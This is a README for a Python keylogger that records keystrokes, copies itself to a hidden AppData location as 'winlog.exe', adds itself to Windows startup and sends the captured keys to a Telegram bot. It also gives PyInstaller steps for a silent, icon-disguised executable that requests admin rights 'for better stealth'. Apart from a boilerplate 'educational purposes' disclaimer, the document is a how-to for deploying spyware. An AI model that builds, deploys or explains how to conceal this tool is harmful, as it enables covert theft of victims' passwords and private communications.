# Keylogger

A Python keylogger that sends captured keystrokes to a Telegram bot.

## Features

- Captures keystrokes including special keys
- Sends logs to Telegram at regular intervals
- Auto-hides and adds itself to Windows startup
- Runs silently in the background

## Requirements

- Python 3.x
- Windows OS (for autorun functionality)
- Required packages:

  pynput
  requests

## Installation

1. Install the required packages:

   pip install pynput requests

2. Configure the bot:
- Create a Telegram bot by messaging @BotFather on Telegram
- Get your bot token
- Get your chat ID (send a message to your bot, then check @userinfobot)

3. Update the configuration in `Keylogger.py`:
- Replace `bot_token` with your actual bot token
- Replace `chat_id` with your actual chat ID

## Usage

1. Run the script:
   
   python Keylogger.py

2. The script will:
- Copy itself to a hidden location in AppData
- Add itself to Windows startup registry
- Start capturing keystrokes
- Send captured keystrokes to your Telegram bot every 60 seconds

## Configuration

You can modify these variables in `Keylogger.py`:
- `interval`: Time in seconds between log transmissions (default: 60)
- `filename`: Name of the hidden executable (default: "winlog.exe")

## Creating an Executable

To convert this Python script into a standalone executable (.exe) file:

### Method 1: Using PyInstaller (Recommended)

1. Install PyInstaller:
   
   pip install pyinstaller

2. Create the executable:
   
   pyinstaller --onefile --noconsole Keylogger.py

- `--onefile`: Creates a single executable file
- `--noconsole`: Hides the console window (makes it silent)

3. Find your executable:
   
- Look in the `dist` folder for `Keylogger.exe`

### Method 2: Using Auto-py-to-exe (GUI Alternative)

1. Install the package:
   
   pip install auto-py-to-exe

2. Launch the GUI:

   auto-py-to-exe

3. Configure in the GUI:
- Select your Keylogger.py file
- Choose "One File" option
- Select "Window Based" (to hide console)
- Click "Convert .py to .exe"

### Advanced Options

For better stealth and functionality, use these additional options:
 
pyinstaller --onefile --noconsole --icon=icon.ico --uac-admin Keylogger.py

- `--icon=icon.ico`: Adds a custom icon (optional)
- `--uac-admin`: Requests admin privileges on startup (optional)

### Creating a Custom Icon (Optional)

1. Design or find a 256x256 PNG image
2. Convert to ICO format using an online converter
3. Save as `icon.ico` in your project directory
4. Include it in the PyInstaller command as shown above

### Testing Your Executable

1. Test the executable on a virtual machine first
2. Check that it:
   - Runs silently without showing a console
   - Copies itself to the AppData folder
   - Adds itself to startup registry
   - Sends keystrokes to your Telegram bot

### Important Notes

- Executables from Python scripts often trigger antivirus warnings
- For educational purposes, test only on systems you own
- Consider adding a configuration file for easier customization
- The executable will be larger than the original script due to included Python dependencies

## Security Notes

- This tool is for educational purposes only
- Unauthorized keylogging is illegal and unethical
- Use only on devices you own or have explicit permission to monitor

## Disclaimer

The author is not responsible for any misuse of this software.
